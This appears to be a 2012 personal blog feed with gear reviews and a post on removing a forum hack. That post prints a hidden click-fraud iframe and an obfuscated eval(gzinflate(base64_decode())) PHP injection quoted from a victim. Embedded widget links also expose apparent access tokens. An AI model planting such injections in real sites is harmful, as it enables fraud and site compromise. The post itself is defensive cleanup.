<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: agalmic | DV Digital]]></title>
  <link href="http://www.dan-vidal.com//blog/categories/agalmic/atom.xml" rel="self"/>
  <link href="http://www.dan-vidal.com//"/>
  <updated>2012-10-03T18:39:56-04:00</updated>
  <id>http://www.dan-vidal.com//</id>
  <author>
    <name><![CDATA[Dan Vidal - Pod]]></name>
    <email><![CDATA[dan@dan-vidal.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Getting the best sound from your iDevices.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/03/getting-the-best-sound-from-your-idevices/"/>
    <updated>2012-10-03T01:28:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/03/getting-the-best-sound-from-your-idevices</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/eq.jpg" width="640" height="960" title="'EQ'" ></p>

<p>Being able to take a significant portion of, or the entirety of, your audio library on the road is a wonderful thing. Of course the primary means of doing this for most people is via their iPhone, iPod, or iPad. And, I suppose, some people draft their Android devices into unwilling audio playback devices. And there's probably one person who uses their BlackBerry for this function, maybe. Regardless, iDevices reign supreme nowadays for mobile audio. And, Apple themselves have a host of applications for the Mac, dedicated to making the best audio possible.</p>

<p>Then, why are the default audio optimization options for iOS so miserable?</p>

<!-- more -->


<p>That does baffle me. Apple, as a company, develops and produces applications like <a href="http://www.apple.com/logicpro/">Logic Pro</a>, which is a well-regarded audio production application. But I guess that side of the house doesn't liase with the side of Apple dedicated to their mobile devices. The EQ options never are 100% perfect, and the included earbuds, even the new "EarPods", are horrendous.</p>

<p>So, what's a picky audiophile on-the-go to do?</p>

<p>Surprisingly, car audio is easy. Any decent head unit nowadays has an iOS-compatible USB port, and some manufacturers include iOS compatibility in their stock systems. The huge advantage here is that your iDevice turns into a mere storage unit, and all the decoding and heavy lifting is done in the head unit of your car.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/dof-7823.jpg" width="960" height="640" title="'DEH-4400'" ></p>

<p>In general, the digital-to-analog converter (DAC) in your car's head unit, is superior in quality to the one that ships with an iDevice. It's a $2 part, that probably does a lot of other things as well, in your iPod, and in your Pioneer head unit, for example, it's a $10 discrete component. The advantage here is that your iDevice sends the audio as pure data, and you can then use your head unit's more precise EQ (even a three-band one helps!) for better audio quality.</p>

<p>Now, we're not always in our cars when we're on the go. In an urban area we might be on a bus, walking, jogging, or cycling. Fortunately, one can acquire a decent pair of earbuds for under $60. I'm not going to really argue which one is superior here, since everyone's hearing is different. I personally use the <a href="http://www.polkaudio.com/products/ultrafit500">Polk Audio UF500s.</a> They come with several bud attachments so they're not flying away in the middle of a workout, for example. At a certain point a headphone is a headphone is a headphone when it comes to in-ear types. If I'm doing critical listening I'll have a pair of studio cans like the Sony MDR-7509s (say no to celebrity headphones!) handy.</p>

<p>But, even the best headphones need a good signal to work with it. And on an iDevice, the default EQ options don't cut it. So I did some poking around, and i found several apps. The one that "stuck" with me the most was <a href="http://itunes.apple.com/us/app/equ-the-quality-equalizer/id403704212?mt=8">EQu</a>.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/ozz.jpg" width="640" height="960" title="'EQu'" ></p>

<p>Developed by <a href="http://www.elephantcandy.com/">elephantcandy</a> out of Amsterdam, EQu gives you a full graphic-equalizer control for your iDevice. You can use one of the many available preset EQ curves, or roll your own. I like crisp lows and well-defined highs (without getting too technical), and this little app let me do it. Your iOS presets usually sacrifice one for the other. But this app gives you full control, beyond even having a bunch of faders. In a nutshell, I get decent quality audio, while I'm on the go. More than sufficient for mobile use. I won't power a sound system out of my headphone port with this app, but I'll gladly use this while running or cycling. The app was last updated in July of 2012, so while it isn't explicitly optimized for the iPhone 5 or iOS 6 yet, it will work on the 5, or a device running iOS 6. The developer appears to still be in business, so I'm sure a new version is forthcoming.</p>

<p>But, that being said, it does reveal one weakness, and that's the inherent flaws in the files themselves. I've noticed on some of my songs purchased from the iTunes Music Store, that the low end tends to distort when amplified. You can actually view this in action on the app, it will flash red if the signal is peaking in any respect. However, I do have some straight WAV files from Beatport, which come through with their full fidelity in this app. The app definitely exposes the weaknesses of compressed audio. Shit in, shit out, as they say. Also, the app only works with your music files. Any other audio from any other app/source on your iDevice is subject to the defaults in iOS.</p>

<p>Some users report increased battery consumption with this app. That may be the case, but I'm usually never using it for more than two hours, and it performs just fine in my unscientific testing. Also, any ITMS file purchased before 2009 may not play back due to Apple's DRM at the time, since the app is it's own audio player, and not an EQ for the existing iOS playback app.</p>

<p>A third option exists, for the truly hardcore mobile audiophiles, the <a href="http://v-moda.com/vamp/">VAMP by V-MODA</a>. I had the pleasure during the 2009 Tiësto tour to spend time with Val Kolton, the founder of V-MODA, and he definitely takes his audio seriously. The Vamp reflects this. It's an external DAC/amplifier for the iPhone/iPod, and also acts as a battery too. However, at $600, it's a little rich for my blood. And there's no model for the iPhone 5 yet. I may live a little and consider it after I upgrade, it seems like a badass option, and there are occasions where I'm around the apt and not wanting to disturb the neighbors with my speakers, but I do want mobility. Or for when I'm on a plane and have a pair of 7509s. I love the concept, but I'll reserve judgement until they roll one for the 5.</p>

<p>But, for those of us on a budget, a good pair of earbuds, and the EQu app are a great combo for when you're on the go. It's just too bad you have to spend extra money, whether it's for a head unit in your car with a USB port, the combination of EQu and a decent pair of earbuds, or going full-throttle with a VAMP, to get decent audio out of your iDevice. Apple has the chops in pro audio, it should trickle down to their iDevices. At the least, give us a systemwide graphic equalizer.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[On clicks, likes, and impressions...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/27/on-clicks/"/>
    <updated>2012-09-27T23:34:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/27/on-clicks</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/sneakz.png" width="960" height="472" title="'cURL'" ></p>

<p>Every so often, websites are hacked. Sometimes it's bad, sometimes it's harmless. The usual goal is to infect a viewer's computer with malware, perhaps to join a botnet or something to that effect. Though the ones that fall under the category of "harmless", are actually quite annoying. They are usually trying to drum up clicks, likes, and impressions on a specific site.</p>

<p>And this, ladies and germs, is why the statistics on clicks, likes, and impressions is such a skewed game these days. You can't trust them...</p>

<!-- more -->


<p>Why not?</p>

<p>Well, case in point. TNL was hacked a few days ago. It happens sometimes. The webhost, <a href="http://dreamhost.com/">Dreamhost</a> for TNL is known far and wide for it's cheap and bargain-basement hosting. And they pretty much give you unlimited everything for a few dollars a month. Now, they usually don't add scads of hardware to their clusters to do this, but they subdivide what they already have, much like a cheap motel. With all this subdividing comes a lot of issues, most notably the ability for hackers and script kids to "peer over the walls", as it were, and observe what else is going on on a given server. TNL resides on a shared host, with hundreds of other sites. TNL in and of itself is secure, but it's hard for us to enforce the security when the walls built by the host are not secure, and we do not have the permission to reinforce those walls.</p>

<p>So, people invariably get in.</p>

<p>I first noticed something was amiss when I could not login to the forum's administrative control panel. Well, I could login, but the page failed to render properly. I then noticed some suspicious redirects going on in my browser's status bar. The redirects were pointing towards a site called "clickspro.org". Now, since I helped build TNL, I know each and every aspect of it's functionality. And, clickspro.org was not part of that functionality. Plus, Ryan would not have implemented something new on TNL, since he is not really paid to do that, and if he did, he would have notified me, especially considering it's been over three years since TNL has explicitly seen any new features.</p>

<p>So, I started a little investigating.</p>

<p><strong>Disclaimer: I am not a real computer security expert. I just know things and get by with a little help from my friends. I assume no liability for what is below. Posting this to help the community. YMMV. Thanks!</strong></p>

<p>Random things of this nature have happened before, and usually the culprit is a line or two of code that is inserted at the top of a page. This code typically points to malware, but in this case, it didn't. I used the UNIX tool "cURL" to investigate. cURL will render an HTML document in your Terminal window at the code level. cURL is basically a command-line browser.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>podbookair:podpress pod$ curl http://forum.talknightlife.com/adm/index.php?sid=1c88841aa35bdee4c5aafca116f06513</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>This rendered the admin control panel for TNL in it's raw HTML format. Therein, I spotted the offending code:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;iframe width="10" height="10" style="visibility:hidden;position:absolute;left:0;top:0;" src="http://click.clickspro.org/feed/frames.php?uid=56&frames=3">&lt;/iframe>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>That does not belong.</p>

<p>So, I Googled various iterations of the offending code. This turned out to be a fairly new attack that PHP-based web applications were falling victim to, and not much was known about it other than it being benign and not malicious in intent.</p>

<p>I had an email exchange with Ryan on the subject, and he suggested it was involving Javascript. As it was late, the conversation kind of ended there. TNL was still functioning, but I was locked out of the cockpit, as it were.</p>

<p>The next day I chose to follow his line of reasoning. I looked around for Javascript files that did not belong. TNL is a complex, poorly-documented machine. Our fault, but it is what it is. I didn't find anything of note. The only Javascript files were legit, and needed for the operation of TNL.</p>

<p>I got back to Google. I found a random forum posting on the subject at that point, over on the <a href="http://community.mybb.com/thread-126714-post-917538.html#pid917538">support site for MyBB</a>, which is a cousin of phpBB, the software that drives TNL.</p>

<p><blockquote><p></p></p><p><p>Same here, damn idiot hacker writes into my WordPress index.php files these lines</p></p><p><p></p><footer><strong>adormind</strong> <cite><a href='http://community.mybb.com/thread-126714-post-917538.html#pid91753'>Unknown Iframe on Index Page, Site Redirecting to Other From Mobile</a></cite></footer></blockquote></p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>eval(gzinflate(base64_decode('7L0HYBxJliUmL23Ke39K9UrX4HShCI&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>BgEyTYkEAQ7MGIzeaS7B1pRyMpqyqBymVWZV1mFkDM7Z28995777333nvvvf&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>e6O51OJ/ff/z9cZmQBbPbOStrJniGAqsgfP358Hz8iivN063ctmiZvt36387&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>a8c+cXpxdlNcnKFH8e4p/Pdg9/4+THfiyv66r+/et8VdVtsbzY2rnDH6/qYt&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>luffy4OK+zRZ5eFbN2/tlHuzsfpfO8uJi38nvTXpf5Zx9dFk0xKcqivX40L2&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>azfHm4qpqiLarlo2zSVOW6zQ/L/Lx9tHPYViv6l96sp599NG/b1aO7d6dlMX&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>075n+bVV2Nq/ri7nmez+5y3814NV/9Huti9tn9T3+hfPLZvY+OHt8V1I4+Bs&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>K/5DdO/p8AAAD//w==')));?>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Basically, it seems that it is possible to execute a Javascript function, and obfuscate it through base64. I'm not the best at security, but I remembered base64 from my USENET days, where files were encoded in that manner to facilitate speedy transmission and also ensure a modicum of obscurity. In a nutshell, USENET kids transferred porn this way to keep it on the down-low. If you don't know what USENET is, Google it.</p>

<p>So, with this knowledge, I looked at some of our PHP files. I was SSHed into TNL directly, and used nano, a basic text editor, to view the offending files.
<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hawks:~/talknightlife.com/forum> nano index.php</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/score.png" width="960" height="480" title="'Score!'" ></p>

<p>That garbage up top is the base64-encoded Javascript which was causing my issue. Deleted it. Saved, and my ACP functionality was restored.</p>

<p>TNL continues on as normal. Happiness is restored to the gossip shop. Thanks to Ryan for pointing me in the right direction.</p>

<p>What mystifies me though, and I'm finally getting to the point of this rant, is that to implement this, it took some doing. This wasn't a ten-second hack. Some damn kid in Manila took probably about a half-hour or more to do this, all for the sake of putting a script on TNL which would generate only a few random clicks to some weird website elsewhere.</p>

<p>A lot of effort, for little return. Clicks, likes, and impressions. It's all a bullshit game. Your site has 100000 hits. So what? How does that convert to something tangible? If it's an ecommerce site, are people buying anything? If it's a site based on content, are people reading it? What is the meaningful metric? Oh, you have 100000 fans on Facebook? So? You only know their names, if that! Facebook took away the ability to easily browse your fanbase years ago. That number is equally meaningless. And now you have to pay Facebook to broadcast your message to all of them. Which is good for Facebook, but not-so-good for you. Statistics on web properties are always hideously inflated. To be impressed by those numbers is foolish. I would rather have 1000 people who really are engaged by my content and my product, than 50000 people who only clicked because they were told to, or if those clicks were the result of a script.</p>

<p>It's sad that people actually pay for this sort of thing. It's why my tactic with regards to web properties I don't explicitly own or have control over is to get people off them as fast as possible. I'll use social media to my advantage, but my final tactic is to get people off of the social media network, and right where I can get at them one-on-one, i.e. on this very blog, or over on TNL. For the record I don't harvest emails for marketing or spam. I tend to let people contact me. I value the interaction bought about by someone who is genuinely interested in what I am saying or selling. I'd rather have that one loyal follower who will stay with me through the years because I treat them right and with respect, rather than as a commodity. I guess I'm the boutique shopkeeper with the little store off to your right, rather than the Wal-Mart. I don't play the stats game. I've opted out. I get a few score viewers here on a daily basis. But I know them, or at least of them. We have a dialog, a real relationship. Not a bunch of meaningless egocentric clicks and likes.</p>

<p>Besides, my real followers, when they do choose or need to do business with me, pay real money. The pennies from clicks and likes may add up over time, but the methodology is dishonest and distasteful. And, even if I didn't find it so, it's really annoying.</p>

<p>Give me the real data and content.</p>

<p>And to the kid in Manila? Sorry about that. I know you're just doing your job, and it's better than the alternative of street prostitution, but I have to look after my interests. If I could pay it forward, I would. Maybe I am, by doing my little part in kicking down the clicks conspiracy.</p>

<p>Sidebar: If you are here searching for the solution to the jsunpack base64 clickspro problem, welcome! Take a look around after you are done fixing your systems.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[More on the Canon 50 1.2 L]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/27/more-on-the-canon-50-1-dot-2-l/"/>
    <updated>2012-09-27T11:53:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/27/more-on-the-canon-50-1-dot-2-l</id>
    <content type="html"><![CDATA[<p><p><a href='/blog/2012/09/27//' data-instagram-url='http://instagr.am/p/QEfxiVggDY/' class='instagram-image'><img src='http://distilleryimage0.s3.amazonaws.com/4c65b4c0087411e2bfbf22000a1e9be6_7.jpg' alt='Testing 50 1.2 L - insane. #bokeh #w210 #305 #brickell #designdistrict' height='612' width='612' /></a><br/>Filtered with <a href='/blog/categories/normal'>Normal</a> through <a href='/blog/categories/instagram'>Instagram</a></p><!--more--><p><a href='http://maps.google.com?q=25.835181305,-80.182557106'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.835181305,-80.182557106&markers=25.835181305,-80.182557106&zoom=14&size=612x200&sensor=false' alt='Talk Nightlife' /></a><br/>Taken at Talk Nightlife</p><p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73}&response_type=token&scope=likes+comments' id='289496019622822104_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p></p>

<p>I took a little drive around last night to further test and experiment with my new Canon 50 1.2 L.</p>

<p>This time, it was more to test the shallow depth-of-field characteristics at <em>f1.2</em>. Again, at that aperture, your zone of acceptable focus is quite shallow.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/dof-7868.jpg" width="960" height="640" title="'E320 W210 50 1.2 L'" ></p>

<p>As you can see here, the hood ornament on my W210 is only partially in focus. The central part of the left spoke is sharp, with the left circular part of the ornament fading into a rather pleasant blur. And the distant background exhibits the smooth bokeh this lens is known for.</p>

<p>Now, this was shot handheld with autofocus engaged. So, this shot is technically a little "off".</p>

<p>At such shallow depths-of-field, every movement counts. If you drift forwards or backwards even slightly, your zone of acceptable focus will change noticeably.</p>

<p>However, this is only noticeable to a great extent when one is doing closeup macro-style shots of objects. The tolerance is a little different at a longer range, as you can see here with this image I took of a <a href="http://miami.car2go.com/">Car2Go Miami</a> Smart Fortwo in Brickell.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/dof-7865.jpg" width="960" height="640" title="'Car2Go Miami 50 1.2 L'" ></p>

<p>Images like these, at a standoff range, can be done handheld, since the further away you are from your object, the less shallow your zone of critical focus becomes. You can do it handheld, that's for sure. That being said, sometimes it's not always practical to use a tripod. So, the best you can do in these situations is focus manually, and stay very still. Sounds simplistic, but in the case of street photography, you can't really overproduce a shot, in my mind.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/dof-7879.jpg" width="960" height="640" title="'Street Graffiti Design District Miami 50 1.2 L'" ></p>

<p>The advantage of digital, of course, is that you can take as many images as you need, to get the desired image. This photo below, I initially did with autofocus. Of course, the results were a little off. However, when I manually focused, crouched down, and took three shots in succession, I landed the one I wanted. Not "spray-and-pray" but a small three-frame burst to insure I got what I wanted. Of course the ultimate insurance would have been using my tripod, but at 3 AM in Miami's Design District, breaking out equipment at a grand scale isn't advisable.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/dof_rev-7894.jpg" width="960" height="640" title="'W210 Design District Miami 50 1.2 L'" ></p>

<p>Not out of any sense of danger really, but more out of a sense of "It's 3 in the morning and I don't want to rig up a tripod for a test photo..."</p>

<p>So, in a nutshell, if you are going to shoot with this at it's most shallow depth-of-field, I definitely recommend using a tripod, as well as focusing manually, if you are shooting your subject at close range. If you stand off a bit, it becomes less of a problem of course since your zone of acceptable focus becomes correspondingly wider.</p>

<p>But, with these characteristics in mind, the 50 1.2 L is definitely a worthwhile addition to any photographic arsenal. Everyone needs a solid 50mm prime lens, and this is the most solid one in it's class on the market.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Some thoughts on the Canon 50 1.2 L lens.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/24/some-thoughts-on-the-canon-50-1-dot-2-l-lens/"/>
    <updated>2012-09-24T22:16:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/24/some-thoughts-on-the-canon-50-1-dot-2-l-lens</id>
    <content type="html"><![CDATA[<p><p><a href='/blog/2012/09/24//' data-instagram-url='http://instagr.am/p/P-xQvYggJh/' class='instagram-image'><img src='http://distilleryimage1.s3.amazonaws.com/e540a00406b411e28a2c22000a1d0378_7.jpg' alt='Action @clubspacemiami w @djlouispuig @sharam @jhartlein @rzo4423 @brittanyviolin @pluckster more at http://seenightlife.com/users/pod/albums/the-louis-puig-marathon' height='612' width='612' /></a><br/>Filtered with <a href='/blog/categories/normal'>Normal</a> through <a href='/blog/categories/instagram'>Instagram</a></p><!--more--><p><a href='http://maps.google.com?q=25.784715407,-80.193181247'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.784715407,-80.193181247&markers=25.784715407,-80.193181247&zoom=14&size=612x200&sensor=false' alt='Club Space' /></a><br/>Taken at Club Space</p><p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73}&response_type=token&scope=likes+comments' id='287884080866001505_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p></p>

<p>Well, today was a bit contentious. But in a good way. My prior commentary on the <a href="http://edmsnob.com/">EDM Snob</a> revealing himself generated a fair amount of buzz, and also some direct emails to me. Some agreed with me, some didn't, but the magic was that they went through the trouble to email me and their replies were well-prepared and thought out. Even if you think I'm wrong, I always appreciate a well-crafted message. To quote my friend <a href="http://pingup.com/">Dade</a>, "It's the nuances I appreciate..."</p>

<p>That being said, I'm sure my benign lens review will generate far less controversy and commentary. I spew forth about the de-anonymizing of some guy in the dance music scene and it's game on. I post an educational piece and I get one reply.</p>

<p>Anyways, let's be an agalmic cowboy and balance out the karma bank a bit.</p>

<p>I recently decided to live a little and invest in a 50 1.2 L prime lens from Canon. This is currently the fastest lens that Canon currently produces. With a maximum aperture of 1.2, this lens can practically "see in the dark".</p>

<p>I'm not going to bore you guys with MTF charts and line pairs per mm comparisons. It's been done. This lens has been around for about a decade now, and the scientific reviews have been done and done again. Instead, I'm going to speak about my personal experience with this lens thus far.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/lpm-7530.jpg" width="640" height="960" title="'Jordyn 50 1.2 L'" ></p>

<p>I picked it up used from <a href="http://adorama.com/">Adorama</a> for a shade over $1200 US total. Adorama rated the condition as "E+" which basically means it was probably a floor demo or something to that effect. The date code has the construction of this specific copy of the lens of sometime in 2008. Now, according to most photo bloggers, the date code matters little, since typically high-priced pieces of glass sometimes can sit for years before they ship out to retailers, or in fact sit on the shelves of the retailers themselves for awhile. So, even though this copy is almost 5 years old, it arrived looking as fresh as the day Canon made it. Adorama of course inspected it and cleaned it, but you can still tell when a lens has been taken care of. Included was a front and rear cap, and even the lens hood, which is normally a separate item.</p>

<p><p><a href='/blog/2012/09/21//' data-instagram-url='http://instagr.am/p/P2XI_QAgFP/' class='instagram-image'><img src='http://distilleryimage3.s3.amazonaws.com/02677ac4042411e2bea81231381a404b_7.jpg' alt='L.' height='612' width='612' /></a><br/>Filtered with <a href='/blog/categories/hefe'>Hefe</a> through <a href='/blog/categories/instagram'>Instagram</a></p><!--more--><p><a href='http://maps.google.com?q=25.835181305,-80.182557106'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.835181305,-80.182557106&markers=25.835181305,-80.182557106&zoom=14&size=612x200&sensor=false' alt='Talk Nightlife' /></a><br/>Taken at Talk Nightlife</p><p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73}&response_type=token&scope=likes+comments' id='285517399124476239_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p></p>

<p>The build quality is consistent with the other L-series lenses by Canon. Metal housing and mount, and a great deal of weight. This isn't a light lens by any stretch. The main reason I bought this, other than the fast 1.2 maximum aperture, was the build. Shooting clubs and events can beat up your gear, so I don't like to take chances.</p>

<p>Case in point, a few years ago, I owned the Canon EF-S 17-55 2.8 IS lens. A wonderful piece of glass in it's own right, this was the "L" lens of the EF-S (crop body mount) lenses. However, it didn't have the build quality of a true L lens, and after about a year, the IS mechanism failed on it. Rather than repair it, I sold it to <a href="http://keh.com">KEH</a> and got a credit towards my current ultrawide angle champ, the 16-35 2.8 L, which has served me faithfully for over six years now.</p>

<p>If you shoot in any sort of environment that could be considered "rough", buy your glass accordingly. It might seem strange to pay $1200 for a fixed focal length lens, but the build quality will save you money in the long run.</p>

<p>However, all the build quality in the world matters not, if the lens itself does not perform.</p>

<p>And perform it does.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/lpm-7442.jpg" width="960" height="640" title="'DJ Louis Puig of Space Miami 50 1.2 L'" ></p>

<p>The color rendition is amazing. Vivid, though accurate, with very little chromatic aberration, which can be fixed in post if it bothers you that much. The sharpness is unrivaled by any other 50mm prime I've tried, whether it be the Canon 50mm 1.4, or any number of third-party primes in that class. L glass is simply in a class of it's own. At it's max aperture of 1.2 your subject is decently sharp. The sweet spot for this piece of glass is from around 2.8 and up to f8 in my experience. This is simply a superb piece of prime glass.</p>

<p>However, shooting with it can be a personal challenge. Unlike it's bulkier, more expensive cousin, the 85mm 1.2 L, the 50 1.2 L has a decent autofocus mechanism. Your AF will land all the time, every time, where you want it. This is dependent on your body though. The 5D MK II I use isn't known for having the best autofocus, but I have my ST-E2 with it's assist beam to help things along. I landed my AF almost every time. Now, with that being said, I was experimenting with shooting at the max aperture of 1.2 a lot of the time.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/roland-7199.jpg" width="960" height="640" title="'Roland at Gryphon 50 1.2 L'" ></p>

<p>Even at lesser ISOs than 6400, at 1.2 you are letting in a lot of light. Of course the tradeoff is that your depth of field is insanely shallow. Using a handy <a href="http://www.dofmaster.com/dofjs.html">depth-of-field</a> calculator, you can see that it is around <em>.07 feet</em> at the distance I took the above photo of Roland at. So, not much to work with. Some not used to this shallow DOF blame the lens. It's not the lens, it's you. It's just real challenging to shoot at that shallow depth of field and land your shot properly. You will need to take multiple images and also, if possible, advise your subject to stay as still as possible. If they move, your composition can be thrown off as your specific focus point can move out of the acceptable area of focus.</p>

<p>Though it is the challenge that makes it fun. While you might have a lot of throwaways at first, after time you will get used to the unique qualities of this amazing lens. I haven't used it consistently enough yet, but now that I own a copy, I know I will get better with it over time. I've already landed quite a few unique images because of this, and I know I will do more as I get acquainted with the properties of this lens. Having the capability to go that shallow with your depth of field can yield some amazing results, whether you are in a nightclub environment, or a controlled daytime situation.</p>

<p>Even with the challenges of shooting with it, I can definitely recommend this lens. You can save a lot of money by buying it's cheaper cousin, the 50 1.4, however, the faster aperture and superb build quality of the 50 1.2 L will make up for the savings over the course of time. L glass is for a lifetime, and investing in it is definitely worth the effort.</p>

<p>Check out my <a href="http://seenightlife.com/users/pod/albums/the-louis-puig-marathon">last two</a> <a href="http://seenightlife.com/users/pod/albums/roland-returns-to-gryphon">galleries</a> over at <a href="http://seenightlife.com/">See Nightlife</a> for more example images using this lens under real-world, less-than-ideal conditions. I will definitely be posting more examples of what this lens can do as time goes on, including on how this is ideal for video.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How I handle noise in a photo.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/20/how-i-handle-noise-in-a-photo/"/>
    <updated>2012-09-20T02:09:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/20/how-i-handle-noise-in-a-photo</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/rs-6346.jpg" width="960" height="640" title="'Space Crowd'" ></p>

<p>OK, like I said I'll try and pass on some know-how from time to time on here. I can document what I do, but it's up to any of you guys who use it to know when and where to use it.</p>

<p>But I'm not going to turn this into a lecture series or motivational speaker session. The world has enough of those.</p>

<p>Anyways, the biggest question I get is, <em>"How the hell do you shoot at a high ISO and manage the noise?"</em></p>

<p>Well, fact is, I don't manage it really...</p>

<!-- more -->


<p>Hmm, well, maybe I do sometimes.</p>

<p>Fact is, we've come a long way in terms of noise in digital imaging systems, and prior to that, the grain present in analog processes involving film. And even when there was noise and grain present, it was largely left alone or used as part of the composition as a whole. The important part was capturing the moment, and the noise was disregarded in favor of the subject as a whole. Which is what I tend to do. ISO 6400 isn't really that bad. It's actually less noisy/grainy than the ISO 400 film stock I "grew up" on.</p>

<p>But, when I do want to deal with or minimize the noise, I don't employ conventional noise reduction techniques as it were. Plugins are generally all over the place and time-consuming, and the built-in NR functions of popular imaging applications tends to make the end images too soft.</p>

<p>So, what I keep in mind is my end result and intent. Despite the fact I shoot with a camera which has a 22-megapixel sensor, most of my images are downsized to 960 x 640. At that resolution, noise is generally hard to pick out. The image at the lead of this article is actually quite noisy in some respects. However, you can't see much of it since it has been reduced in size by many multiples to be displayed on your monitor. And, unless you have a Retina display (and yes, you'll probably have to forget a lot of what I just told you in that regard), there is really not a huge amount of detail present in the above image.</p>

<p>Now, if that image were to go to print, I would usually insist on matte paper. Matte paper masks the noise wonderfully. The texture overrides a lot of the noisier characteristics of the image.</p>

<p>If I'm forced into a glossy presentation, I then usually move on to "plan B". Plan B doesn't involve a lot of work, and doesn't involve any noise reduction plugins or techniques. Note, this whole idea assumes you shot RAW. You are shooting RAW, right? Another assumption I'm making here is that I've probably already told you to use Lightroom. If not, the concepts carry over. Drop me a line if you need help in another package, maybe I can figure it out for you.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/lr1.png" width="845" height="467" title="'LR'" ></p>

<p>Basically, I ask myself, <em>"Where does this noise exist in the color spectrum?"</em></p>

<p>In most cases, I find the noise exists in the red and magenta channels of the color spectrum. Which does make sense, since noise tends to be a function of heat and energy in a digital sensor system, and that energy conveys itself as a lower frequency "color" of sorts. Now, some people would suggest desaturating in the affected channels. Doesn't really work that way. If you do this, you are left with a muddled grey mess, which looks worse than the existing noise did.</p>

